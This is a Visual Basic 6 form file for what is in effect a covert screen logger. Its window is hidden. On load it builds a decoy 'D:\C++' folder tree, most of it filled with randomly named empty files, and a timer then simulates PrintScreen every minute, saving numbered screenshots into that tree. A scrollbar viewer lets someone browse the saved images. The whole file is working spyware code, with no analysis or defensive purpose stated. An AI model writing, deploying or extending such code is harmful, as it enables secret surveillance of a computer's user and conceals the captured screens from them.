VERSION 5.00
Begin VB.Form Form1 
   ClientHeight    =   5175
   ClientLeft      =   60
   ClientTop       =   405
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   5175
   ScaleWidth      =   4680
   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
   Visible         =   0   'False
   WindowState     =   2  'Maximized
   Begin VB.PictureBox Picture1 
      AutoSize        =   -1  'True
      Height          =   5130
      Left            =   0
      ScaleHeight     =   5070
      ScaleWidth      =   2160
      TabIndex        =   0
      Top             =   0
      Width           =   2220
      Begin VB.VScrollBar VScroll1 
         Height          =   5025
         Left            =   0
         Min             =   1
         TabIndex        =   1
         Top             =   0
         Value           =   1
         Width           =   300
      End
   End
   Begin VB.Timer Timer1 
      Interval        =   60000
      Left            =   1740
      Top             =   1320
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Private WithEvents File1 As FileListBox
Attribute File1.VB_VarHelpID = -1

Private Sub File1_Click()

End Sub

Private Sub Form_Load()
Randomize
If Dir("D:\C++", vbDirectory) = "" Then MkDir ("D:\C++")
If Dir("D:\C++\About_C++", vbDirectory) = "" Then MkDir ("D:\C++\About_C++")
If Dir("D:\C++\Dlls", vbDirectory) = "" Then
    MkDir ("D:\C++\Dlls")
    For X = 0 To Rnd * 40 + 10
        Name_of_txt = Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97)
        Open "D:\C++\Dlls\" & Name_of_txt For Output As #1
        Close #1
    Next X
End If
If Dir("D:\C++\doc", vbDirectory) = "" Then
    MkDir ("D:\C++\doc")
    For X = 0 To Rnd * 35 + 10
        Name_of_txt = Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97)
        Open "D:\C++\doc\" & Name_of_txt For Output As #1
        Close #1
    Next X
End If
If Dir("D:\C++\include", vbDirectory) = "" Then
    MkDir ("D:\C++\include")
    For X = 0 To Rnd * 30 + 10
        Name_of_txt = Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97)
        Open "D:\C++\include\" & Name_of_txt For Output As #1
        Close #1
    Next X
End If
If Dir("D:\C++\Lib", vbDirectory) = "" Then
    MkDir ("D:\C++\Lib")
    For X = 0 To Rnd * 25 + 10
        Name_of_txt = Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97)
        Open "D:\C++\Lib\" & Name_of_txt For Output As #1
        Close #1
    Next X
End If
If Dir("D:\C++\libs", vbDirectory) = "" Then
    MkDir ("D:\C++\libs")
    For X = 0 To Rnd * 20 + 10
        Name_of_txt = Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97)
        Open "D:\C++\libs\" & Name_of_txt For Output As #1
        Close #1
    Next X
End If
If Dir("D:\C++\scripts", vbDirectory) = "" Then
    MkDir ("D:\C++\scripts")
    For X = 0 To Rnd * 15 + 10
        Name_of_txt = Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97)
        Open "D:\C++\scripts\" & Name_of_txt For Output As #1
        Close #1
    Next X
End If
If Dir("D:\C++\tcl", vbDirectory) = "" Then
    MkDir ("D:\C++\tcl")
    For X = 0 To Rnd * 10 + 10
        Name_of_txt = Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97) + Chr(Int(Rnd * (122 - 97 + 1)) + 97)
        Open "D:\C++\tcl\" & Name_of_txt For Output As #1
        Close #1
    Next X
End If
Set File1 = Me.Controls.Add("VB.FileListBox", "File1")
File1.Pattern = "*.*"
File1.Path = "D:\C++\About_C++\"
VScroll1.Max = CStr(File1.ListCount)
If CStr(File1.ListCount) > 0 Then Picture1.Picture = LoadPicture("D:\C++\About_C++\P 1.bmp")
End Sub

Private Sub Picture1_Click()

End Sub

Private Sub Timer1_Timer()
keybd_event vbKeySnapshot, 0&, 0&, 0&
DoEvents
SavePicture Clipboard.GetData(vbCFBitmap), "D:\C++\About_C++\P" & Str(Val(CStr(File1.ListCount)) + 1) & ".bmp"
End Sub

Private Sub VScroll1_Change()
Picture1.Picture = LoadPicture("D:\C++\About_C++\P" + Str(VScroll1.Value) + ".bmp")
End Sub
